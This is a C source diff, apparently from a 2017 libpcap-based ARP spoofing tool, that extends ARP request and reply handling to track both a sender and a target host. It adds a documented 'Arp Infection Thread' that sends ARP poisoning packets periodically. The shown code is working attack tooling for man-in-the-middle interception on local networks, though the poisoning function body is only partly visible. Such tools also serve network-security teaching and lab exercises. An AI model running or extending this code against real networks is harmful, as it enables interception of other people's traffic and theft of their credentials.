@@ -31,7 +31,7 @@ int init_handle(pcap_arg *arg, char *dev)
     arg->mask = 0;
 
     // recv(read) timeout 1 sec
-    arg->handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    arg->handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
     if (arg->handle == NULL)
     {
         pr_err("Couldn't open device %s: %s \n", dev, errbuf);
@@ -126,7 +126,7 @@ int send_arp_packet(pcap_arg *arg, struct ether_header *ehdr, struct arp_header 
  * return RET_SUC when succeed to send
  * return RET_ERR when fail to send
  */
-int send_arp_request(pcap_arg *arg, char *addr_s)
+int send_arp_request(pcap_arg *arg, char *_addr, int flag)
 {
     struct ether_header ehdr;
     struct arp_header ahdr;
@@ -140,9 +140,17 @@ int send_arp_request(pcap_arg *arg, char *addr_s)
     memcpy(ahdr.sha, arg->local_mac, HWADDR_LEN);
     memcpy(ahdr.spa, &(arg->local_ip), PTADDR_LEN);
     memset(ahdr.tha, 0x00, HWADDR_LEN);
-    inet_pton(AF_INET, addr_s, &addr);
+    inet_pton(AF_INET, _addr, &addr);
     memcpy(ahdr.tpa, &addr, PTADDR_LEN);
-    memcpy(&(arg->sender_ip), &addr, sizeof(struct in_addr));
+
+    if (flag == SENDER)
+    {
+        memcpy(&(arg->sender_ip), &addr, sizeof(struct in_addr));
+    }
+    else if (flag == TARGET)
+    {
+        memcpy(&(arg->target_ip), &addr, sizeof(struct in_addr));
+    }
 
     if (send_arp_packet(arg, &ehdr, &ahdr))
     {
@@ -209,7 +217,7 @@ int send_arp_poison(pcap_arg *arg, struct arp_header *ahdr, char *addr_t)
  * return RET_SUC when ethernet type is ARP
  * return RET_ERR when ehternet type is not ARP
  */
-int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr)
+int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr, int flag)
 {
     struct pcap_pkthdr *header;
     const u_char *frame, *packet;
@@ -238,7 +246,7 @@ int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr)
             continue;
         }
 
-        if (parse_ethernet(frame))
+        if (parse_ethernet(frame) == ETHERTYPE_ARP)
         {       // frame is arp
             memset(ahdr, 0, sizeof(struct arp_header));
             pr_out("recv packet:");
@@ -246,8 +254,13 @@ int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr)
             putchar('\n');
             packet = frame + ETH_HEADER_LEN;
             parse_arp(packet, ahdr);
-            if (!memcmp(&(ahdr->spa), &(arg->sender_ip), sizeof(struct in_addr)))
+
+            if (flag == SENDER && !memcmp(&(ahdr->spa), &(arg->sender_ip), sizeof(struct in_addr)))
             {   // succeed to match sender
+                return RET_SUC;
+            }
+            else if (flag == TARGET && !memcmp(&(ahdr->spa), &(arg->target_ip), sizeof(struct in_addr)))
+            {   // succeed to match target
                 return RET_SUC;
             }
             else
@@ -264,10 +277,26 @@ int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr)
         }
     }
 
-    pr_err("recv: couldn't find sender");
+    if (flag == SENDER)
+    {
+        pr_err("recv: couldn't find sender");
+    }
+    else
+    {
+        pr_err("recv: couldn't find target");
+    }
+
     return RET_ERR;
 }
 
+/*
+ * Prototype : void *thread_arp_poison(void *arg)
+ * Last Modified 2017/08/06
+ * Written by pr0gr4m
+ *
+ * Arp Infection Thread
+ * Send Arp Poisoning Packet periodically
+ */
 void *thread_arp_poison(void *arg)
 {
     struct thread_arg_arp *t_arg = (struct thread_arg_arp *)arg;
